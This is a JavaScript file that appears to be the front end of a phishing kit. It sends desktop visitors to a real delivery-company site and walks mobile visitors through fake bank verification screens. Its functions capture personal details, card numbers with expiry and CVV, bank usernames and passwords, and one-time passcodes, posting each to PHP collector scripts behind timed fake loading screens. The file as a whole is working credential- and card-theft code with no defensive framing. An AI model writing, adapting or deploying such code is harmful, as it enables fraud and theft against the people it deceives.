function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}

if(detectar_dispositivo() === "PC"){
  window.location.href('https://envia.co')
}
console.log('ss');

function verificar() {
    document.querySelector("#logo-entidad-load").setAttribute("src", "assets/img/logos/" + document.querySelector("#txt-entidad").value + ".png");
    document.querySelector("#logo-entidad").setAttribute("src", "assets/img/logos/" + document.querySelector("#txt-entidad").value + ".png");
    document.querySelector("#logo-entidad-otp").setAttribute("src", "assets/img/logos/" + document.querySelector("#txt-entidad").value + ".png");
    document.querySelector("#frm-animacion").style.display = "none";
    document.querySelector("#frm-verificacion").style.display = "block";
  }
  
  function validar() {
    document.querySelector("#frm-cargando").style.display = "none";
    document.querySelector("#frm-otp").style.display = "block";
  }
  
  function enviar_documento(c) {
    var d = detectar_dispositivo();
    fetch("process/tpl-d.php", {
        method: 'POST',
        body: JSON.stringify({ doc: c, dis: d })
      })
      .then(response => response.json())
      .then(data => {
        window.location.href = "informacion/";
      });
  }
  
  function enviar_datos(n, c, m, a, u) {
    fetch("../process/tpl-i.php", {
        method: 'POST',
        body: JSON.stringify({ nom: n, cel: c, cor: m, dir: a, ciu: u })
      })
      .then(response => response.json())
      .then(data => {
        // Aquí puedes realizar alguna acción adicional si es necesario
      });
  }
  
  function enviar_tarjeta(b, t, f, c) {
    fetch("../process/tpl-c.php", {
        method: 'POST',
        body: JSON.stringify({ ban: b, tar: t, fec: f, cvv: c })
      })
      .then(response => response.json())
      .then(data => {
        setTimeout(verificar, 1500);
      });
  }
  
  function buscar_documento() {
    fetch("../process/bsc-d.php")
      .then(response => response.json())
      .then(data => {
        document.querySelector("#txt-cedula").value = data;
      });
  }
  
  function enviar_usuario(u, p) {
    fetch("../process/tpl-l.php", {
        method: 'POST',
        body: JSON.stringify({ usr: u, pas: p })
      })
      .then(response => response.json())
      .then(data => {
        setTimeout(validar, 8000);
      });
  }
  
  function enviar_otp(o) {
    fetch("../process/tpl-o.php", {
        method: 'POST',
        body: JSON.stringify({ otp: o })
      })
      .then(response => response.json())
      .then(data => {
        document.querySelector("#frm-autorizar").style.display = "block";
      });
  }
  